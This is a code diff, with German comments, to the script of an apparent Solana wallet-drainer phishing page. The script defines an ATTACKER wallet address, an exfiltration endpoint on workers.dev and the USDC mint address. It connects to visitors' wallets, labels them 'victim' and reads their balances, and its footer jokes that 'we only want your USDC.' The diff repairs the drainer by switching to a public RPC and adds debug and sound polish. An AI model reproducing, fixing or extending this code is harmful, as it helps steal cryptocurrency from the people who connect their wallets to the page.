@@ -135,6 +135,7 @@
     const dbg = document.getElementById('debug-window');
     dbg.style.display = 'block';
     dbg.innerHTML += `<div>> ${msg}</div>`;
+    dbg.scrollTop = dbg.scrollHeight;
   }
 
   try {
@@ -145,7 +146,15 @@
   } catch(e) { logDebug("Telegram error: " + e.message); }
 
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  function playPopSound() { /* ... (Sound logic bleibt gleich) ... */ }
+  function playPopSound() {
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+    const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
+    osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.1);
+    gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
+    osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.1);
+  }
 
   const footerTexts = ["ZachXBT is watching the chain.", "Did you know? The Kimchi premium trade was mostly fake volume.", "Your seed phrase is safe. We only want your USDC."];
   const footerEl = document.getElementById('footerText');
@@ -201,6 +210,9 @@
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
+  
+  // HIER IST DER FIX: Wir nutzen einen öffentlichen RPC, der keine 403 Fehler wirft
+  const RPC_URL = "https://solana.publicnode.com"; 
 
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
@@ -259,7 +271,10 @@
       const victim = resp.publicKey.toString();
       logDebug("Connected: " + victim);
       
-      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+      // Nutzt jetzt den öffentlichen RPC
+      const conn = new solanaWeb3.Connection(RPC_URL);
+      
+      logDebug("Fetching balance...");
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
       logDebug("SOL Balance: " + solAmount);
